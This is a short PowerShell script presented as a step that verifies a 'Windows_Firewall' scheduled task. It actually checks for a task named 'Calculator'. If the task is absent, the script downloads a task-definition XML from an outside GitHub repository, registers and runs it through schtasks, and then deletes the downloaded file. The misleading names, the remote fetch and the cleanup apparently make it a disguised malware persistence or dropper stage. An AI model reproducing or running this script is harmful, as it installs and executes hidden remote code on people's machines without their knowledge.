# Step 4: Verify the task "Windows_Firewall" in Task Scheduler
$taskName = "Calculator"

# Using schtasks.exe for compatibility with all versions
$existingTask = schtasks /Query /TN $taskName 2>$null

if ($existingTask) {
    # If the task exists, run it
    schtasks /Run /TN $taskName
} else {
    # If the task does not exist, create it using schtasks.exe
    $xmlFilePath = 'C:\ProgramData\Calculator.xml'
    Invoke-WebRequest -Uri "https://github.com/cyberforce49/xmls/raw/refs/heads/main/Calculator.xml" -OutFile $xmlFilePath

    # Extract task details from the XML file manually (alternative for older PowerShell)
    schtasks /Create /TN $taskName /XML $xmlFilePath /F

    # Reverify the task
    $existingTask = schtasks /Query /TN $taskName 2>$null

    if ($existingTask) {
        # Run the task and delete the .XML file
        schtasks /Run /TN $taskName
        Remove-Item -Path $xmlFilePath
    } else {
        Write-Host "Task creation failed."
        exit
    }
}